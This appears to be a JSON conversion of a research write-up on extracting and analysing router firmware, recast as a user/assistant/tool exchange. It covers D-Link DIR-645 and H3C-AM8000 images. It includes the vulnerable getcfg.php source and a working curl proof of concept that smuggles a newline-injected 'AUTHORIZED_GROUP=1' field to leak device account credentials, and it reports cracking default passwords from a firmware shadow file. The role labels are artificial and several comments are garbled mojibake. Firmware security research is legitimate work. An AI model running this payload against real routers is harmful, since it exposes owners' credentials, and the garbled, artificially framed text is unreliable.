@@ -1,0 +1,120 @@
+{
+    "_source_md":  "Binfiles/2021-07-08-Router-BinFile-Analysis.md",
+    "version":  "router-binfile-analysis",
+    "title":  {
+                  "zh":  "路由器固件二进制文件分析",
+                  "en":  "Router Binary File Analysis"
+              },
+    "description":  {
+                        "zh":  "记录路由器固件提取过程，包括DLink-DIR645和H3C-AM8000的固件分析与敏感信息泄露。",
+                        "en":  "Documents router firmware extraction process, including DLink-DIR645 and H3C-AM8000 firmware analysis and sensitive information leakage."
+                    },
+    "steps":  [
+                  {
+                      "type":  "user_message",
+                      "content":  {
+                                      "zh":  "分析路由器固件二进制文件",
+                                      "en":  "Analyze router binary files"
+                                  },
+                      "annotation":  {
+                                         "zh":  "用户执行操作",
+                                         "en":  "用户执行操作"
+                                     },
+                      "codeBlocks":  [
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "鉃?strings DIR645A1_FW102B08.bin | grep \"hsqs\"             \n\nhsqs\n\n\n鉃?hexdump -C DIR645A1_FW102B08.bin | grep -n \"hsqs\"\n\n88066:00160090  68 73 71 73 a3 07 00 00  29 64 cc 4e 00 00 01 00  |hsqs....)d.N....|",
+                                             "language":  "bash"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "鉃?dd if=DIR645A1_FW102B08.bin bs=1 count=100 skip=1441936 of=squash\n\n100+0 records in\n\n100+0 records out\n\n100 bytes copied, 0.0387127 s, 2.6 kB/s\n\n\n鉃?file squash \n\nsquash: Squashfs filesystem, little endian, version 4.0, 5958022 bytes, 1955 inodes, blocksize: 65536 bytes, created: Wed Nov 23 03:10:33 2011",
+                                             "language":  "bash"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "$ git clone https://github.com/mirror/firmware-mod-kit.git\n\n$ sudo apt-get install build-essential zlib1g-dev liblzma-dev python-magic\n\n$ cd firmware-mod-kit/src\n\n$ ./configure \u0026\u0026 make\n\n#杩欓噷椤轰究涓€鎻愶細ln: failed to create hard link \u0027uncomp_r.c\u0027 =\u003e \u0027uncomp.c\u0027: Operation not permitted\n\n#鎶ラ敊鏄搷浣滀笉琚厑璁革紝鍥犱负鎴戝浘鐪佷簨瀹夸富鏈哄叡浜簡涓€涓枃浠跺す缁欒櫄鎷熸満锛宮ake鎿嶄綔閮芥槸鍦ㄥ叡浜枃浠跺す涓嬶紝瀵艰嚧鏉冮檺瀛樺湪闂\n\n$ make clean\n\n$ mv firmware-mod-kit/* ~/Desktop/firmware-mod-kit/ \u0026\u0026 cd firmware-mod-kit/src \n\n$ ./configure \u0026\u0026 make\n\n#绱ф帴鐫€鐩存帴瀵筴ernel.squash杩涜瑙ｅ寘鍗冲彲\n\n$ cd ../ \u0026\u0026 ./unsquashfs_all.sh ../kernel.squash",
+                                             "language":  "bash"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "$ binwalk -Me DIR645A1_FW102B08.bin\n\n$ cd _DIR645A1_FW102B08.bin.extracted/\n\n$ /{path/to/firmware-mod-kit}/unsquashfs_all.sh 160090.squashfs",
+                                             "language":  "bash"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "HTTP/1.1 200 OK\nContent-Type: text/xml\n\n\u003c?echo \"\u003c?\";?\u003exml version=\"1.0\" encoding=\"utf-8\"\u003c?echo \"?\u003e\";?\u003e\n\u003cpostxml\u003e\n\u003c? include \"/htdocs/phplib/trace.php\";\n\nif ($_POST[\"CACHE\"] == \"true\")\n{\n\techo dump(1, \"/runtime/session/\".$SESSION_UID.\"/postxml\");\n}\nelse\n{\n\t/* cut_count() will return 0 when no or only one token. */\n\t$SERVICE_COUNT = cut_count($_POST[\"SERVICES\"], \",\");\n\tTRACE_debug(\"GETCFG: got \".$SERVICE_COUNT.\" service(s): \".$_POST[\"SERVICES\"]);\n\t$SERVICE_INDEX = 0;\n\twhile ($SERVICE_INDEX \u003c $SERVICE_COUNT)\n\t{\n\t\t$GETCFG_SVC = cut($_POST[\"SERVICES\"], $SERVICE_INDEX, \",\");\n\t\tTRACE_debug(\"GETCFG: serivce[\".$SERVICE_INDEX.\"] = \".$GETCFG_SVC);\n\t\tif ($GETCFG_SVC!=\"\")\n\t\t{\n\t\t\t$file = \"/htdocs/webinc/getcfg/\".$GETCFG_SVC.\".xml.php\";\n\t\t\t/* GETCFG_SVC will be passed to the child process. */\n\t\t\tif (isfile($file)==\"1\") dophp(\"load\", $file);\n\t\t}\n\t\t$SERVICE_INDEX++;\n\t}\n}\n?\u003e\u003c/postxml\u003e",
+                                             "language":  "php"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "curl -d \"SERVICES=DEVICE.ACCOUNT\u0026attack=ture%0aAUTHORIZED_GROUP=1\" \"http://{ip.addr}:{ip.port}/info/getcfg.php\"",
+                                             "language":  "bash"
+                                         }
+                                     ]
+                  },
+                  {
+                      "type":  "assistant_text",
+                      "content":  {
+                                      "zh":  "工具准备：VM Ubuntu 18、Binwalk、firmware-mod-kit",
+                                      "en":  "Tools preparation: VM Ubuntu 18, Binwalk, firmware-mod-kit"
+                                  },
+                      "annotation":  {
+                                         "zh":  "助手响应",
+                                         "en":  "助手响应"
+                                     }
+                  },
+                  {
+                      "type":  "tool_result",
+                      "toolName":  "exec",
+                      "content":  {
+                                      "zh":  "手动提取hsqs systemfiles：strings | grep检索文件系统magic签名头，hexdump查找偏移，dd提取文件",
+                                      "en":  "Manual hsqs systemfiles extraction: use strings | grep to find filesystem magic signature, hexdump for offset, dd for file extraction"
+                                  },
+                      "annotation":  {
+                                         "zh":  "工具执行结果",
+                                         "en":  "工具执行结果"
+                                     }
+                  },
+                  {
+                      "type":  "assistant_text",
+                      "content":  {
+                                      "zh":  "DIR-645敏感信息泄露：通过getcfg.php可获取设备配置信息，构造POC：curl -d \u0027SERVICES=DEVICE.ACCOUNT\u0026attack=ture%0aAUTHORIZED_GROUP=1\u0027",
+                                      "en":  "DIR-645 sensitive info leakage: Get device config via getcfg.php. POC: curl -d \u0027SERVICES=DEVICE.ACCOUNT\u0026attack=ture%0aAUTHORIZED_GROUP=1\u0027"
+                                  },
+                      "annotation":  {
+                                         "zh":  "助手响应",
+                                         "en":  "助手响应"
+                                     }
+                  },
+                  {
+                      "type":  "assistant_text",
+                      "content":  {
+                                      "zh":  "H3C-AM8000固件直接binwalk解包，发现shadow文件，通过john破解默认账号密码。",
+                                      "en":  "H3C-AM8000 firmware directly unpacked by binwalk, found shadow file, cracked default credentials with john."
+                                  },
+                      "annotation":  {
+                                         "zh":  "助手响应",
+                                         "en":  "助手响应"
+                                     }
+                  }
+              ]
+}
